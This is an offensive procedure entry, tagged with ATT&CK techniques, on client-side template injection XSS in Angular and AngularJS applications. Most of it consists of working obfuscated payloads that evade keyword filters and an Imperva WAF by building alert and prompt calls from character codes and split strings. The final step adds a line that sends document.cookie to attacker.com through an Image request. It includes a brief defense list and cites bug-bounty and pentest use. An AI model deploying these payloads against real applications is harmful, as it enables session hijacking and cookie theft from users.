---
id: 24a28980-7e85-40f0-a64e-18287855b493
name: Advanced-XSS-Bypass-in-Angular-and-AngularJS
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.722265+00:00'
updated_at: '2023-04-10T20:24:52.632756+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command and Scripting Interpreter|T1059.007 - JavaScript]]'
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Advanced bypassing XSS]]'
  - '[[tags/Client Side Template Injection]]'
  - '[[tags/XSS in Angular and AngularJS]]'
  - xss
  - angular
  - angularjs
  - waf-bypass
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Advanced-XSS-Bypass-in-Angular-and-AngularJS

## Summary

This procedure exploits client-side template injection vulnerabilities in Angular and AngularJS applications to achieve cross-site scripting (XSS) by injecting obfuscated JavaScript payloads. It demonstrates techniques to bypass input validation, escape characters, and web application firewalls (WAFs) like Imperva, enabling execution of arbitrary code in the victim's browser for data theft or session hijacking.

## Description

Angular and AngularJS frameworks process user input through templates, which can lead to client-side template injection if not properly sanitized. This procedure covers advanced XSS payloads that use HTML entities, String.fromCharCode(), unicode escapes, and prototype pollution-like obfuscation to evade filters. These techniques are particularly effective against applications with partial sanitization or WAF rules that block direct script tags or common alert/prompt calls. The attack targets web applications where user input is rendered in Angular expressions (e.g., {{ userInput }}). Successful exploitation allows attackers to steal cookies, keystrokes, or perform further actions like phishing within the application context. This is commonly used in bug bounty programs or penetration testing to demonstrate high-impact vulnerabilities.

## Requirements

1. Identification of a client-side template injection point in an Angular or AngularJS application (e.g., via reflected input in {{ }} expressions).
2. Knowledge of JavaScript, Angular templating, and common WAF evasion techniques.
3. Access to the target web application, typically via a browser or proxy tool like Burp Suite for payload testing.
4. No server-side access required, but a controlled environment for testing payloads is recommended.

## Defense

- Implement strict input validation and output encoding for all user inputs in Angular templates, using Angular's built-in sanitization (e.g., DomSanitizer).
- Deploy web application firewalls (WAFs) configured to detect Angular-specific expressions and obfuscated JavaScript (e.g., Imperva or ModSecurity rules for {{ }} and fromCharCode patterns).
- Regularly scan applications with tools like OWASP ZAP or Snyk for client-side template injection vulnerabilities and apply framework updates promptly.
- Enable Content Security Policy (CSP) to restrict inline script execution and monitor for anomalous JavaScript behavior via browser dev tools or logging.

## Objectives

1. Identify and exploit a template injection vulnerability to inject malicious Angular expressions.
2. Bypass sanitization and WAF filters using obfuscated payloads to execute JavaScript.
3. Achieve code execution in the victim's browser to prompt domain information, alert, or exfiltrate data.
4. Demonstrate potential for session hijacking or data theft in a realistic attack scenario.

## Instructions

### Step 1: Identify Template Injection Point

**Context**: Locate an input field or parameter that is reflected unsanitized into an Angular template (e.g., search box rendering as {{searchTerm}}). Test with a benign payload like {{7*7}} to confirm execution (should output 49).

Use browser developer tools to inspect the rendered HTML and confirm Angular/AngularJS usage.

**Expected Output**: Payload executes and displays the result, indicating injection is possible.

### Step 2: Escape Quotes Using HTML Entities

**Context**: Angular expressions often require quotes for strings; use HTML entities to bypass filters that strip or block direct quotes, allowing construction of valid JS strings.

Insert &#39; for single quotes and &quot; for double quotes in your payload. For example, in a template: {{'It&#39;s working!'}}.

**Expected Output**: The escaped string renders correctly without syntax errors, confirming quote bypassing.

### Step 3: Inject Basic XSS Payload with fromCharCode

**Context**: Construct a simple alert payload by converting ASCII values to characters using String.fromCharCode to evade keyword-based filters on 'alert'.

**Code** ([[codes/Angular-XSS-fromCharCode-Alert]]):

```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

Inject this into the vulnerable template expression. The payload builds 'alert(1)' from char codes (a=97, l=108, etc.) and executes it.

**Expected Output**: A browser alert box pops up displaying '1', confirming JS execution.

### Step 4: Deploy Obfuscated Payload for Domain Prompt

**Context**: Use numeric obfuscation with base-36 conversion and chained prototype methods to build and execute a prompt(document.domain) without direct keywords, evading WAFs.

**Code** ([[codes/Obfuscated-Angular-Prompt-Domain-fromCharCode]]):

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

Inject into the template. This generates a random key 'a', accesses String.prototype methods indirectly, and prompts the document domain.

**Expected Output**: Browser prompt displays the current domain (e.g., example.com).

### Step 5: Test Variant with fromCodePoint for Unicode Handling

**Context**: If fromCharCode is filtered, use fromCodePoint for modern JS environments, following the same obfuscation pattern to build 'prompt(document.domain)'.

**Code** ([[codes/Obfuscated-Angular-Prompt-Domain-fromCodePoint]]):

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

Inject and observe execution.

**Expected Output**: Prompt shows domain, similar to Step 4.

### Step 6: Alternative Obfuscation with Array Join for WAF Bypass

**Context**: Split sensitive words like 'constructor' across arrays and join them to avoid direct string matching in WAF rules, then chain to execute prompt with unicode escapes.

**Code** ([[codes/AngularJS-Imperva-WAF-Bypass-Payload]]):

```javascript
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\u{6f}mpt(d\u{6f}cument.d\u{6f}main)')()}}
```

This uses \u{6f} for 'o' to further obfuscate. Inject into AngularJS template.

**Expected Output**: Prompt executes despite WAF, displaying domain.

### Step 7: Verify and Escalate

**Context**: After successful prompt/alert, escalate by replacing with data exfiltration (e.g., send document.cookie to attacker server via Image src).

Modify payloads to include: new Image().src='http://attacker.com/?c='+document.cookie;

Test in a non-production environment.

**Expected Output**: Network request to attacker server with stolen data.
